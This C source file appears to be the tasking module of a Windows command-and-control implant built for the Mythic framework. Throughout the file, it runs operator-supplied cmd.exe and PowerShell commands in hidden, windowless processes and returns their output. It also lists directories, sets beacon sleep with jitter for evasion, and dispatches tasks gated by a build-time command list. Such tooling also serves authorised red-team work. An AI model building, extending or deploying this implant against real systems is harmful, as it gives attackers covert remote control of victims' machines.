#include "common.h"
#include "config.h"
#include "mythic.h"
#include "tasks.h"

/* Run `prog /c arg`, capture combined output (caller frees). */
static char *run_capture(const char *prog, const char *arg, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rfd = NULL, wfd = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char cmd[8192], *out = NULL;
    size_t len = 0, cap = 0;
    DWORD got = 0;
    *exit_code = -1;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rfd, &wfd, &sa, 0))
        return NULL;
    if (!SetHandleInformation(rfd, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = wfd;
    si.hStdError = wfd;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));
    snprintf(cmd, sizeof(cmd), "%s /c %s", prog, arg ? arg : "");
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    CloseHandle(wfd);
    CloseHandle(pi.hThread);
    out = (char *)malloc(4096);
    if (!out) {
        CloseHandle(rfd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    cap = 4096;
    for (;;) {
        if (len + 1024 > cap) {
            char *grown = (char *)realloc(out, cap * 2);
            if (!grown)
                break;
            out = grown;
            cap *= 2;
        }
        if (!ReadFile(rfd, out + len, 1023, &got, NULL) || got == 0)
            break;
        len += got;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        *exit_code = (int)code;
    }
    CloseHandle(rfd);
    CloseHandle(pi.hProcess);
    out[len] = '\0';
    return out;
}

/* Parse "interval [jitter]". */
static int parse_sleep(const char *arg, int *interval, int *jitter) {
    char *end = NULL;
    long iv, jt = 0;
    if (!arg || *arg == '\0')
        return -1;
    iv = strtol(arg, &end, 10);
    if (end == arg || iv < 0 || iv > 8640000)
        return -1;
    while (*end == ' ' || *end == '\t')
        end++;
    if (*end != '\0') {
        jt = strtol(end, &end, 10);
        if (jt < 0 || jt > 100)
            return -1;
    }
    *interval = (int)iv;
    *jitter = (int)jt;
    return 0;
}

/* Membership test over a comma-separated command list ("a,b"). Matches
 * whole entries only; an empty list allows everything. */
int command_in_list(const char *list, const char *name) {
    size_t namelen;
    const char *p;
    if (!list || *list == '\0')
        return 1;
    if (!name || *name == '\0')
        return 0;
    namelen = strlen(name);
    p = list;
    while (*p) {
        const char *start, *end;
        while (*p == ' ' || *p == '\t' || *p == ',')
            p++;
        if (*p == '\0')
            break;
        start = p;
        while (*p && *p != ',')
            p++;
        end = p;
        while (end > start && (end[-1] == ' ' || end[-1] == '\t'))
            end--;
        if ((size_t)(end - start) == namelen && memcmp(start, name, namelen) == 0)
            return 1;
    }
    return 0;
}

/* List dir, one entry per line ("name/" for subdirs). Caller frees *out. */
static int run_ls(const char *dir, char **out) {
    char pattern[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char *buf = NULL;
    size_t len = 0, cap = 0, dlen;
    *out = NULL;
    if (!dir || *dir == '\0')
        dir = ".";
    dlen = strlen(dir);
    if (dlen + 3 >= sizeof(pattern))
        return -1;
    memcpy(pattern, dir, dlen);
    if (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'))
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "*");
    else
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "\\*");
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;
    buf = (char *)malloc(4096);
    if (!buf) {
        FindClose(h);
        return -1;
    }
    cap = 4096;
    buf[0] = '\0';
    do {
        size_t n;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        n = strlen(fd.cFileName) + 3;
        if (len + n > cap) {
            char *grown = (char *)realloc(buf, cap * 2);
            if (!grown)
                break;
            buf = grown;
            cap *= 2;
        }
        len += (size_t)snprintf(buf + len, cap - len, "%s%s\n", fd.cFileName,
                                (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "/" : "");
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    *out = buf;
    return 0;
}

typedef int (*task_fn_t)(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now);

static int task_shell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    (void)a;
    (void)exit_now;
    *output = run_capture("cmd.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_powershell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    (void)a;
    (void)exit_now;
    *output = run_capture("powershell.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_sleep_cmd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int iv = 0, jt = 0;
    (void)exit_now;
    if (parse_sleep(arg, &iv, &jt) != 0) {
        resp->status = "error: usage: sleep <interval> [jitter]";
        resp->user_output = resp->status;
        return 0;
    }
    a->interval = iv;
    a->jitter = jt;
    *output = (char *)malloc(64);
    if (*output) {
        snprintf(*output, 64, "sleep set to %ds jitter %d%%", iv, jt);
        resp->user_output = *output;
    }
    return 0;
}

static int task_ls(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)exit_now;
    if (run_ls(arg, output) != 0) {
        *output = (char *)malloc(512);
        if (*output) {
            snprintf(*output, 512, "error: cannot list %.400s",
                     (arg && *arg) ? arg : ".");
            resp->status = *output;
        } else {
            resp->status = "error: ls failed";
        }
        resp->user_output = resp->status;
        return 0;
    }
    resp->user_output = *output;
    return 0;
}

static int task_exit(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)arg;
    (void)output;
    resp->user_output = "exiting";
    *exit_now = 1;
    return 0;
}

/* Dispatch table. To add a command, add a row plus a task_* handler here,
 * a row in the Go table (agent_code/tasks.go) and a row in the container
 * commandSpecs. */
static const struct {
    const char *name;
    task_fn_t fn;
} task_table[] = {
    {"shell", task_shell},
    {"powershell", task_powershell},
    {"sleep", task_sleep_cmd},
    {"ls", task_ls},
    {"exit", task_exit},
};

int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, int *exit_now) {
    char scratch[8192];
    const char *arg;
    size_t i;
    *output = NULL;
    *exit_now = 0;
    resp->task_id = t->id;
    resp->user_output = "";
    resp->completed = 1;
    resp->status = "success";
    arg = task_arg(t->parameters, scratch, sizeof(scratch));
    for (i = 0; i < sizeof(task_table) / sizeof(task_table[0]); i++) {
        if (strcmp(t->command, task_table[i].name) == 0) {
            if (!command_in_list(CFG_COMMANDS, t->command)) {
                *output = (char *)malloc(128);
                if (*output) {
                    snprintf(*output, 128, "error: command %.32s not included in this build",
                             t->command);
                    resp->status = *output;
                } else {
                    resp->status = "error: command not included in this build";
                }
                resp->user_output = resp->status;
                return 0;
            }
            return task_table[i].fn(a, arg, resp, output, exit_now);
        }
    }
    resp->status = "error: unknown command";
    resp->user_output = resp->status;
    return 0;
}

void task_sleep(int interval, int jitter) {
    int ms, delta, low, span;
    if (interval <= 0)
        return;
    if (jitter <= 0) {
        Sleep((DWORD)interval * 1000);
        return;
    }
    delta = interval * jitter / 100;
    low = interval - delta;
    if (low < 0)
        low = 0;
    span = interval + delta - low;
    ms = low + (span > 0 ? rand() % (span + 1) : 0);
    Sleep((DWORD)ms * 1000);
}
